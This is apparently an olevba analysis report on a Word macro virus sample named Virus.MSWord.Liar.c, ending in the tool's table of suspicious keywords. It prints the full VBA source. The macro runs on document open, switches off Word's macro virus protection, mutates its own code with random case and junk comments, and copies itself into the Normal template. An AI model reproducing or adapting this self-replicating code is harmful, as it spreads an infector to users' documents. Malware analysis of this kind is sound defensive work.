olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.c-05cae2ef93218d4c8c18cf4f4b1b1323fcd3459d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.c-05cae2ef93218d4c8c18cf4f4b1b1323fcd3459d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Do you see what I see? Do you hear what I hear?'
Rem Do you feel what I feel?'
Rem Do you ever cared?'
Rem                           -jackie twoflower-'
Private Sub Document_Open() '
On Error Resume Next '
Dim Bm630(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set Cf546 = MacroContainer.VBProject: Set Ll729 = Cf546.VBComponents(1) '
Set De594 = Ll729.CodeModule: Set Jh11 = NormalTemplate: Li495 = Chr(39) '
If MacroContainer = Jh11 Then Set Jh11 = ActiveDocument '
Set Vu944 = Jh11.VBProject.VBComponents(1).CodeModule: Eo654 = De594.CountOfLines: Tt963 = 100 + Int(Rnd * 50) '
For No220 = 1 To Eo654: Su942 = "": Di568 = Int(Rnd * 4): Qp530 = InStr(De594.Lines(No220, 1), Li495) '
If Qp530 = 1 And Eo654 > Tt963 Then '
Di568 = 1: GoTo Eq83 '
End If '
Dg903 = UCase(Left(De594.Lines(No220, 1), (Qp530 - 1))) '
For Uv117 = 1 To Len(Dg903): Gx417 = Mid(Dg903, Uv117, 1) '
If Asc(Gx417) < 90 And Asc(Gx417) > 65 Then Gx417 = Chr(Asc(Gx417) + Int(Rnd * 2) * 32) '
Bm630(No220) = Bm630(No220) & Gx417: Next Uv117 '
For Gr444 = 1 To Int(75 - Int(Rnd * 20)): Su942 = Su942 & Chr(255 - Int(Rnd * 100)): Next Gr444 '
Bm630(No220) = Bm630(No220) & Li495 & Su942 '
If Di568 = 2 Then Bm630(No220) = Bm630(No220) & vbCr & Li495 & Su942 '
Ut894 = Ut894 & Bm630(No220) & vbCr '
Eq83: '
Next No220 '
If Vu944.CountOfLines < (0 + 2) Then '
Vu944.DeleteLines 1, Vu944.CountOfLines: Vu944.AddFromString Ut894 '
If Jh11 = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
End Sub '
Rem Another macro bug by jackie twoflower's Class Macro Kit v1.0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

